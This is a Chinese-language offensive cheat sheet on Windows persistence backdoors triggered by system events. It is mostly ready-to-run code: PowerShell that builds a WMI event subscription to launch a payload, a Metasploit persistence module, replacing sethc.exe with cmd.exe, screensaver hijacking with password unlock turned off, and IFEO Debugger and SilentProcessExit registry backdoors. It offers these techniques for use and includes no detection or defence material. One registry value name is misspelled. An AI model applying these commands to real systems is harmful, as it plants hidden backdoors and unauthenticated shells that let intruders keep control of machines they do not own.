# 事件触发执行后门

#### WMI订阅后门手动利用(ps)

创建事件过滤器

```
$EventFilterArgs = @{
	EventNamespace = "nb"
	Query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 240 AND TargetInstance.SystemUpTime < 325"
	QueryLanguage = 'WQL'
}
$EventFilter = Set-WmiInstance -Namespace root\subscription -Class __EventFilter -Arguments $EventFilterArgs
```

创建事件消费者，在指定事件发生时执行后门

```
$CommandLineEventConsumerArgs = @{
	Name = "lbw"
	CommandLineTemplate = "cmd.exe /k C:\108.exe"
}
$EventConsumer = Set-WmiInstance -Namespace root\subscription -Class CommandLineEventConsumer -Arguments $CommandLineEventConsumerArgs
```

事件过滤器与事件消费者绑定

```
$FilterConsumerBindingArgs = @{
	Filter = $EventFilter
	Consumer = $EventConsumer
}
$FilterConsumerBinding = Set-WmiInstance -Namespace root\subscription -Class __FilterToConsumerBinding -Arguments $FilterConsumerBindingArgs
```

**Sharp-WMIEvent WMI订阅利用**

* github自查

**Metasploit 内置WMI订阅利用**

```
use exploit/windows/local/wmi_persistence
```

#### 利用系统辅助功能

* sethc.exe 粘贴键 连续5次Shift键
* magnify.exe 放大镜 WIndows + "+"
* utilman.exe 实用程序 Windows + U
* osk.exe 屏幕键盘 Windows+Ctrl+O
* displayswitch.exe 屏幕扩展 Windows + P
* atbroker.exe 辅助管理工具
* narrator.exe 讲述者 Windows+Ctrl+Enter

获取TrustedInstaller权限后

```
cd C:\Windows\System32
move sethc.exe sethc.exe.bak
copy cmd.exe sethc.exe
```

#### 利用屏幕保护程序

* 屏幕保护程序具有.scr文件扩展名的可执行文件组件
* 系统注册表项计算机\HKEY\_CURRENT\_USER\Control Panel\Desktop
* SCRNSAVE.exe 设置屏幕保护程序的路径，其指向以.scr扩展名的可执行文件
* ScreenSaveActive 设置是否启用屏幕保护程序，默认为1表示启用
* ScreenSaverIsSecure 设置是否需要密码解锁，设为0表示不需要密码
* ScreenSaveTimeOut 设置执行屏幕保护程序之前不活动的超时

修改屏幕保护程序的执行路径(scrnsave.exe键的值)，触发屏幕保护时执行自定义后门

```
reg add "HKEY_CURRENT_USER\Control Panel\Desktop" /v SCRNSAVE.exe /t REG_SZ /d "C:\xxx.scr"
```

启用屏幕保护

```
reg add "HKEY_CURRENT_USER\Control Panel\Desktop" /v ScreenSaveActive /t REG_SZ /d 1
```

设置不需要密码解锁

```
reg add "HKEY_CURRENT_USER\Control Panel\Desktop" /v ScreenSaverIsSecur /t REG_SZ /d "0"
```

设置用户不活动的超时设为60秒

```
reg add "HKEY_CURRENT_USER\Control Panel\Desktop" /v ScreenSaveTimeOut /t REG_SZ /d "60"
```

#### IFEO注入

* IFEO使开发人员能将调试器附加到应用程序
* IFEO是Windows系统的一个注册表项，路径为计算机\HKEY\_LOCAL\_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options

**Debugger键值利用**

* 用户启动计算机的程序后，系统会在注册表的IFEO中查询所有程序的子键，如果存在与该程序名称相同的子健，就读取对应子健的"Debugger"键值，如果该键值未被设置，默认不做处理，否则直接用该键值所指定的程序路径来代替原始程序。

编辑"Debugger"的值，通过修改注册表方式创建粘滞键后门

```
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe" /v Debugger /t REG_SZ /d "C:\Windows\System32\cmd.exe"
```

**GlobalFlag**

* IFEO指定程序静默退出时启动任意监控程序

启动对记事本的进程静默退出监视

```
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\notepad.exe" /v GlobalFlag /t REG_DWORD /d 512
```

启动Windows错误报告WerFault.exe成为后门的父进程

```
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\notepad.exe" /v ReportingMode /t REG_DWORD /d 1
```

将监视器进程设为后门

```
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\notepad.exe" /v MonitorProcess /d "C:\108.exe"
```
